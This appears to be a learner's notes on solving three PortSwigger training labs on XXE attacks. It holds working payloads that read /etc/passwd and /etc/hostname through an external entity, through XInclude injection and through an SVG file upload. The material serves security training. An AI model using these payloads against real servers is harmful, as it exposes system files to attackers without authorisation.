[lab: Exploiting XXE using external entities to retrieve files]
url: https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-retrieve-files
solution: solution should be somewhat similar to the following:
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
    <stockCheck>
        <storeId>
           9
        </storeId>
        <productId>
           &xxe;
        </productId>
    </stockCheck>

[lab: Exploiting XInclude to retrieve files]
url: https://portswigger.net/web-security/xxe/lab-xinclude-attack
solution: using burpsuite, send proxy intercept to repeater and send a request similar to the following:
  productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1

[lab: Exploiting XXE via image file upload]
url: https://portswigger.net/web-security/xxe/lab-xxe-via-file-upload
solution: (note: I eventually looked at the solution for this one, as I couldn't get the correct tag ('text') to use without additional help.) 
    step-1: using burpsuite repeater, create a request with the following as the avatar:
    <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
    <svg width="200" height="200" xmlns="http://www.w3.org/2000/svg">
        <text x="90" y="90">
            &xxe;
        </text>
    </svg>
    step-2: in the response, copy the rendered hostname from burpsuite!
